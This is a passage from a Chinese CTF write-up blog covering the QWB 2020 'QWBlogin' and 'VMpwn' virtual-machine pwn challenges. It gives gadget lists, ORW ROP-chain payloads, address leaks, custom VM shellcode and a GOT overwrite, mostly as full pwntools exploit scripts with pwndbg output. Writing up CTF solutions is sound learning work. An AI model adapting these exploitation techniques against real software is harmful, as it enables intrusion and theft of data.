title="gadgets"></a>gadgets</h4><p>在程序<code>RET</code>之后还有一大段无关的<code>opcode</code>，做到这步的时候才知道，这些就是为了凑<code>gadgets</code>的</p><p>其中标记为<code>R</code>的是不需要限制的</p><pre><code class="hljs python"><span class="hljs-comment"># 0x0d 0xR6 0x00 0x11 0xRR</span>pop_r00_ret = <span class="hljs-number">0x2f5</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x01 0X11 0xRR</span>pop_r01_ret = <span class="hljs-number">0x377</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x02 0x11 0xRR</span>pop_r02_ret = <span class="hljs-number">0x45c</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x03 0x11 0xRR</span>pop_r03_ret = <span class="hljs-number">0x4e1</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x20 0x0a 0x11 0xRR</span>sys_open_ret = <span class="hljs-number">0x6ed</span><span class="hljs-comment"># 0x20 0xR8 0x11 0xRR</span>sys_data_ret = <span class="hljs-number">0x5b1</span><span class="hljs-comment"># 0x20 0xR9 0x11 0xRR</span>sys_stack_ret = <span class="hljs-number">0x617</span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>由于<code>syscall</code>中只有<code>open | read | write | close</code>可用，很自然想到<code>orw</code>，然后构造<code>rop</code>链就行了，其中由于最开始打开了<code>test.bin</code>文件，所以<code>fd=4</code>，最初写<code>exp</code>的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了<code>struct.c =&gt; struct.o</code>再在调试的时候<code>add-symbol-file struct.o 0</code>即可</p><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x108</span><span class="hljs-comment"># read(0, data[0x100], 0x20)</span><span class="hljs-comment"># r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x20</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># open(data[0x100], 0)</span><span class="hljs-comment"># r00 = 0 r01 = 0x200 r02 = 0</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0</span>)payload += p64(sys_open_ret)<span class="hljs-comment"># read(4, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x4</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># write(1, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x1</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)</code></pre><p>强的大佬，不需要<code>instruction.h</code>都能在5个小时内做出来，而我就是只菜鸡</p><p><a href="https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin">QWBlogin 题目</a></p><h2 id="VMpwn"><a href="#VMpwn" class="headerlink" title="VMpwn"></a>VMpwn</h2><p>这个题目跟上一个题目一样先逆向，但是这个题目跟<code>QWBlogin</code>相比实现<code>vm</code>的时候简单一些</p><p>其中有一个 <code>chunk 0x30</code>用来记录寄存器的值<code>vm[0] vm[1] vm[2]</code> 类似<code>rdi, rsi, rdx</code>在<code>syscall</code>时会用到，<code>vm[3]</code>为<code>sp</code>，<code>vm[5]</code>为 <code>pc</code></p><p>在最后的关键操作为对于<code>read(0, stack, 0x1000)</code>（栈只有<code>0x100</code>个字节）</p><pre><code class="hljs assembly">pwndbg&gt; distance 0x555555759050 0x55555575ad680x555555759050-&gt;0x55555575ad68 is 0x1d18 bytes (0x3a3 words) RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0 ► 0x5555555555db    call   rax &lt;0x7ffff7b156c0&gt;        fd: 0x0        buf: 0x55555575ad68 ◂— 0x0        nbytes: 0x1000pwndbg&gt; telescope 0x55555575801000:0000│   0x555555758010 ◂— 0x001:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x002:0010│   0x555555758020 ◂— 0x100003:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x004:0020│   0x555555758030 ◂— 0x005:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10</code></pre><p>然后<code>puts(stack)</code>，可以看到该虚拟栈上有<code>heap</code>地址和<code>elf</code>地址，但是只能泄漏一个</p><pre><code class="hljs assembly">pwndbg&gt; telescope 0x55555575ad68 0x3000:0000│ rsi  0x55555575ad68 ◂— &#39;1234454636\n&#39;01:0008│      0x55555575ad70 ◂— 0xa3633 &#x2F;* &#39;36\n&#39; *&#x2F;02:0010│      0x55555575ad78 ◂— 0x0... ↓1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f (&#39;ok,what &#39;)1f:00f8│      0x55555575ae60 ◂— 0x020:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff</code></pre><p>接下来同第一步的<code>read(0, stack, 0x1000)</code> <code>write(0, stack, 0x20)</code>然后<code>ret</code></p><p>这个程序中有一个两个比较奇怪的地方，由于<code>ret</code>的时候程序的实现，是将<code>sp-=8</code>，但是<code>PUSH</code>为<code>sp-=8</code> <code>POP</code>为<code>sp+=8</code>，因此<code>ret</code>的时候比较奇怪，另外就是与<code>QWBlogin</code>相比没有 什么能用的<code>gadget</code>，因此想法只能为按照<code>vm</code>的规则，写<code>shellocde</code>，然后在最后<code>ret</code>的时候跳转过去，但是该题用 <code>seccomp</code>限制了只能 <code>orw</code>，且没有给<code>open</code>的 <code>syscall</code>只能泄漏</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因此思路就是，先利用<code>puts</code>泄漏<code>elf</code>的地址，然后再<code>ret</code>到最初<code>elf_code+0x3</code>然后再泄漏<code>heap</code>，<code>ret</code>到写入栈上的<code>shellcode</code></p><p>利用<code>puts</code>泄漏<code>libc</code>，然后再次输入到栈上，利用<code>\x6d: mov reg[0], 0</code>作为<code>nop</code>，编写<code>shellcode</code></p><p>然后将<code>open</code>写入<code>free</code>的位置，因此在调用<code>syscall 03</code>时就是调用<code>open</code>，最后利用<code>orw</code>进行读取<code>flag</code></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="hljs python"><span class="hljs-comment"># heap+0x2e68 =&gt; elf_bss</span>io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0xff</span>+<span class="hljs-string">&quot;#&quot;</span>)io.recvuntil(<span class="hljs-string">&quot;#&quot;</span>)elf.address = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x203851</span>success(<span class="hljs-string">&quot;elf&quot;</span>, elf.address)<span class="hljs-comment"># 0xf8 + ret </span>io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(elf.address + <span class="hljs-number">0x203023</span>))io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;\x50&quot;</span>)heap = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x50</span>success(<span class="hljs-string">&quot;heap&quot;</span>, heap)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">mov reg[0], read_got</span><span class="hljs-string">puts</span><span class="hljs-string">mov reg[0], 0</span><span class="hljs-string">mov reg[1], heap + addr</span><span class="hljs-string">mov reg[2], 0x1000</span><span class="hljs-string">read        </span><span class="hljs-string">//  use 0x6d: mov reg[0], 0 as nop</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;\x11&quot;</span> + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])payload += <span class="hljs-string">&quot;\x8f\x02&quot;</span>payload += <span class="hljs-string">&quot;\x6d&quot;</span>payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x1000</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>)payload += p64(heap+<span class="hljs-number">0x2d60</span>)io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, payload)io.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)libc.address = u64(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">flag</span><span class="hljs-string">0x6d * 0x50</span><span class="hljs-string">mov reg[1], elf.address+0x203900</span><span class="hljs-string">mov reg[2], 8</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], heap+0x2d60</span><span class="hljs-string">mov reg[1], 0</span><span class="hljs-string">open</span><span class="hljs-string">mov reg[0], 3</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], 1</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">write</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;flag\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;\x6d&quot;</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.address+<span class="hljs-number">0x2038f8</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">8</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x6e&quot;</span>payload += <span class="hljs-string">&quot;\x8f\x03&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">3</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">1</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x01&quot;</span>io.send(payload)sleep(<span class="hljs-number">0.03</span>)io.send(p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]))io.interactive()io.close()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>vm</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
